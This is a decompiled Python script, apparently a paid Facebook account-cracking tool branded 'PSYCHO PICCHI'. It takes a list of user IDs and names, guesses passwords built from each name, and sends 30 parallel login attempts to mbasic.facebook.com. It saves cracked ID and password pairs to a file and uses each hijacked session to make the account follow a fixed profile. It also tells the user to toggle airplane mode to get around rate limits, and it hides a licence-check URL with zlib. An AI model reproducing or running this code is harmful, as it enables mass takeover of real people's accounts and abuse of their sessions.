# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-04-19 14:47:05.472438
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo =                                          """   
\033[0;93m ____  __  ___  ___  _  _  __  
\033[0;93m(  _ \(  )/ __)/ __)/ )( \(  ) 
\033[0;96m ) __/ )(( (__( (__ ) __ ( )(  
\033[0;96m(__)  (__)\___)\___)\_)(_/(__) 
 
 
 
\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;91mAUTHOR   : PSYCHO PICCHI
 
\033[0;93mFACEBOOK : PSYCHO PICCHI
 
\033[0;96mGITHUB   : PSYCHO-PICCHI 
 
\033[0;95mTOOLS    : FILE CLONING / DUMP 
\033[0;96m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ """                                              

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mPSYCHO_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mPICCHI_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;92mPRESS ENTER TO BACK MENU ")
	    sarfraz()

def sarfraz():




        
  
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] START FILE CLONING')
    print(' [2] DUMP-MAKE FILE')
    print(' [3] EXIT ')
    print('')
    _sarfraz___ = input(' [?] CHOOSE OPTION : ')
    if _sarfraz___ in ('1', '01'):
        __xxx__().sarfrazx(id)
    if _sarfraz___ in ('2', '02'):
        os.system('python dm.py')
    if _sarfraz___ in ('3', '03'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def sarfrazx(self,id):
  
       
      
         
            

        os.system("clear")
        print(logo)
        self.cnt = input('PUT FILE NAME : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] CHOOSE CORRECT ONE');
            self.sarfrazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[PSYCHO] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H}[PSYCHO-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('PSYCHO_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s[PICCHI-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('PICCHI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s[PICCHI-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('PICCHI_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('[1] CRACK WITH AUTO PASS ')
        print('[2] CRACK WITH NAME DIGIT PASS')
        chi = input('\n[?] CHOOSE : ')
        if chi == '':
            print('\nSELECT CORRECT ONE')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;91m\rUSE FLIGHT (airplane) MODE ON\033[1;96m")
            print(50*"-")
            print('\033[1;36mTOTAL IDS : %s ' % len(self.id))
            print('\033[1;36mCRACKING STARTED.....')
            print(50*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # PSYCHO PICCHI BANGLADESH HACKER
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            pwx = ["786110"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;32m\rENTER LAST NAME DIGITs\033[1;32m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUSE FLIGHT (airplane) MODE BEFORE USE\033[1;32m")
            print(50*"-")
            print('\033[1;32mTOTAL IDS : %s ' % len(self.id))
            print('\033[1;32mCRACKING STARTED.....')
            print(50*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Psycho Picchi Bangladesh Hacker
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()
def bnsbuy():
    os.system('clear')
    print (logo)
    from urllib.parse import quote
    print('\tChecking For Subscription...\n')
    try:
        f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\xa4\xcc<\x00}\x1e\x11\x17')
        bd = (zlib.decompress(f))
        to = (open(bd, 'r').read())
    except (KeyError, IOError):
        bnsreg()
    try:
        bt = (b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5710\xd1\xf5\xcb/\xd1uw\r\xd1/\xd6\xcfM\xcc\xcc\xd3O\x04\x00&!\x13&')
        bw = (zlib.decompress(bt))
        r = (requests.get(bw).text)
    except requests.exceptions.ConnectionError:
        print ("\x1b[0;37mNo Internet Connection")
        exit()

    if to in r:
        fuck.append(1)
        sarfraz()
    else:
        os.system('clear')
        print (logo)
        print ('\x1b[1;97m\rYour Token Is Not Subscribed\n')
        print
        print
        print ('\r\x1b[1;97m Your Token : ' + to + '\n')
        print
        print('\rTool Price 350rs\n')
        print
        print('\rjazzcash Account Number 03033212619\n')
        print('\rAccount Name Nazeer Ahmed\n')
        print
        print
        print('\rPayment Successfully Msg Or Token Send\n')
        print
        print
        sb = input('\rPaste Here Payment Successfully Msg:')
        print ('\n')
        ss = input('\rPaste Here your Token:')
        print('\n')
        print('\rYour Request Submitted Please wait  ')
        tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+sb+'%20Token%20:%20'+ss
        os.system('am start https://wa.me/+923206620269?text=' + tks)

def bnsreg():
    os.system('clear')
    print (logo)
    print ('\x1b[1;97m\tYour Token Is Not Subscribed\n')
    print
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~SSB=="
    print
    print ('\n\x1b[1;97m Your Token: \x1b[97m' + id + '\n')
    print
    print('\rTool Price 350rs\n')
    print
    print('\rjazzcash Account Number 03033212619\n')
    print('\rAccount Name Nazeer Ahmed\n')
    print
    print('\rPayment Successfully Msg Or Token Send\n')
    print
    sb = input('\rPaste Here Payment Successfully Msg:')
    print ('\n')
    ss = input('\rPaste Here your Token:')
    print ('\n')
    print('Your Request Submitted Please wait  ')
    tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+sb+'%20Token%20:%20'+ss
    os.system('am start https://wa.me/+923206620269?text=' + tks)
    f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\xa4\xcc<\x00}\x1e\x11\x17')
    bd = (zlib.decompress(f))
    sav = open(bd, 'w') 
    sav.write(id)
    sav.close()
    os.system("clear")
    time.sleep(3)
    exit()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

sarfraz()

